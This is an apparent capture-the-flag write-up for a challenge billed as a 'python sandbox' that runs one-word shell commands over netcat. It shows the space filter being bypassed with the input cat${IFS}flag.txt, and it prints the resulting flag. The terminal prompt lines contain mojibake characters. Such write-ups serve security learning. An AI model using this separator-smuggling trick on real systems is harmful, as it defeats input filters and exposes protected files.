## Challenge Description

I "made" "a" "python" "sandbox" """"
nc 184.72.87.9 8008

## Intuition

It seems the server blacklist the space character so I am not able to `cat flag.txt`.

## Solution

Escape the space character by using the following command:

```bash
â”Œâ”€â”€ðŸ®¤ïšŒ HON3YP0TðŸ®¥â”€ðŸ®¤ï — 192.168.0.234ðŸ®¥â”€ðŸ®¤ïª¨ 192.168.0.17ðŸ®¥
â”œâ”€â”€ðŸ®¤ï„•  ~ðŸ®¥
â””â”€ïŒ§   nc 184.72.87.9 8008                                            [11:51PM ]
Hi! Welcome to the kidz corner sandbox! we made it super safe in here - you can execute whatever command you want, but only one word at a time so you can't do anything too dangerous, like steal our flags!
cat${IFS}flag.txt
flag{did_you_use_ifs_or_python_let_me_know_down_in_the_comments}
```

### Flag

`flag{did_you_use_ifs_or_python_let_me_know_down_in_the_comments}`
